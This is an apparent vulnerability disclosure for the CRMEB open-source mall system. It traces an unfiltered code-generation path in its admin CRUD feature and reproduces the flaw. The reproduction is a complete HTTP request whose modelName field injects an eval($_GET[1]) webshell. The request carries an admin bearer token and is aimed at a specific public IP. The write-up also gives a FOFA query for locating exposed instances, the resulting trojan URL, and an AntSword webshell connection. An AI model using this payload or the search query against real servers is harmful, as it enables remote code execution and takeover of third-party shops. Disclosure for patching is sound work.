CRMEB file upload vulnerability

1. Project introduction

Project address: https://gitee.com/ZhongBangKeJi/CRMEB

Number of project stars: 11.7K

Project introduction: 🔥CRMEB open source mall free and open source multilingual mall system, Tp6 framework mall, the system can be commercialized; Including Mini Program Mall, H5 Mall, Official Account Mall, PC Mall, App, support distribution, grouping, bargaining, seckill, coupons, points, membership levels, Mini Program live broadcast, page DIY, front-end and back-end separation, convenient for two opening, use documents, interface documents, data dictionaries, two open documents/video tutorials, welcome your valuable comments and suggestions.

![image](https://github.com/1dreamGN/CVE/assets/112082417/fdae9fbb-8bec-4fa4-94ac-bafc85476dd6)

fofa syntax: icon_hash="-847565074"

![image](https://github.com/1dreamGN/CVE/assets/112082417/0d79501c-ce76-4cbf-b802-33f582543b15)

2. Audit and reproduction process

File where the vulnerability is located: app/adminapi/controller/v1/setting/SystemCrud.php

![image](https://github.com/1dreamGN/CVE/assets/112082417/90cba4a1-c6a8-4c7c-9323-f9ad2275ef7e)

crud function continues to track the createCrud function

File path: app/services/system/SystemCrudServices.php

![image](https://github.com/1dreamGN/CVE/assets/112082417/222ee4af-42e3-4163-9da4-4603b0f48730)

![image](https://github.com/1dreamGN/CVE/assets/112082417/bee3942c-44fe-417c-9f59-3f73705ea35a)

Follow the makeFile function

![image](https://github.com/1dreamGN/CVE/assets/112082417/bcc6ff21-6890-49b7-b2f5-a3d6107ef4ed)

![image](https://github.com/1dreamGN/CVE/assets/112082417/f2222f2d-0a4f-4ba9-a33b-d71d1765bf65)

Critical error points

![image](https://github.com/1dreamGN/CVE/assets/112082417/73ccde92-cd68-4b40-bc7a-09fcc929acd6)

Follow FileService::batchMakeFiles

![image](https://github.com/1dreamGN/CVE/assets/112082417/57ae854b-97e8-4272-9bb4-e6d40e09aaab)

Create a controller without filtering

Reproduce below

Log in to the background to obtain jwt-token

![image](https://github.com/1dreamGN/CVE/assets/112082417/2d82fe16-e236-4498-b492-79e8e2b8a776)

Construct a payload and request it

```
POST /adminapi/system/crud HTTP/1.1
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json
Host: 222.186.134.155:99
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJiYzUzYmJkZWEzNjk1ODRiNDg1NTkwZGEzZmY3ZWQzOCIsImlzcyI6IjIyMi4xODYuMTM0LjE1NTo5OSIsImF1ZCI6IjIyMi4xODYuMTM0LjE1NTo5OSIsImlhdCI6MTY5NTQ5NTI4NywibmJmIjoxNjk1NDk1Mjg3LCJleHAiOjE2OTgwODcyODcsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.r8iA7llTlmqiNCm9_3MBUE6HVEjV13USJHi08FYPGfI

{ "pid": 25, "tableName": "test", "modelName": "*/?><?php namespace app\\adminapi\\controller\\crud; exit(eval($_GET[1]));//**", "isTable": 1, "menuName": "", "filePath": { "controller": "app/adminapi/controller/crud/Test.php", "route": "app/adminapi/route/crud/test.php" }, "tableField": [ { "field": "id", "field_type": "int", "default": "", "comment": "自增ID", "required": false, "is_table": true, "table_name": "ID", "limit": "15", "primaryKey": 1, "from_type": "" }, { "field": "", "field_type": "varchar", "default": "", "default_type": "-1", "comment": "test", "required": false, "is_table": true, "table_name": "test", "limit": 255, "primaryKey": 0, "from_type": "input", "search": "", "dictionary_id": 0, "hasOne": [], "index": false } ], "deleteField": []}

```

An error is returned. An error is reported in the database. But the file has already been generated



![image](https://github.com/1dreamGN/CVE/assets/112082417/9acda77e-9a2f-49d4-909c-15671b88f7e1)


Trojan address:

http://222.186.134.155:99/adminapi/crud/test?

param：1=phpinfo();

Test antsword links

![image](https://github.com/1dreamGN/CVE/assets/112082417/68da463b-e881-44c6-91e4-4e6ba0d4b980)

Setting the jwt-token file can also be generated to a directory that does not require permission


![image](https://github.com/1dreamGN/CVE/assets/112082417/8b229072-166f-4f2e-9eac-45f397b8f64d)

	






